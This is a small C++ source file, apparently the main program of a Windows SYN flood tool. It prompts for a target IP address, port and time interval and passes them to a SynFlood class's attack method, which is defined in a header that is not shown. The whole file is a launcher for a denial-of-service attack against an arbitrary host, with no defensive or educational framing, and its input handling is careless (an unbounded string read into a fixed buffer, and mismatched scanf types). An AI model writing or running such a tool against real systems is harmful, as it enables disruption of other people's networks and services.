#include "SynFlood.h"
#include <stdio.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Shlwapi.lib")

int main() {
	SynFlood synFlood;
	u_int ip;
	char str_ip[32];
	u_short port;
	u_int interval;

	printf("IP: ");
	scanf("%s", str_ip);
	ip = inet_addr(str_ip);
	printf("Port: ");
	scanf("%d", &port);
	printf("Time interval(ms): ");
	scanf("%d", &interval);

	synFlood.attack(ip, port, interval);
}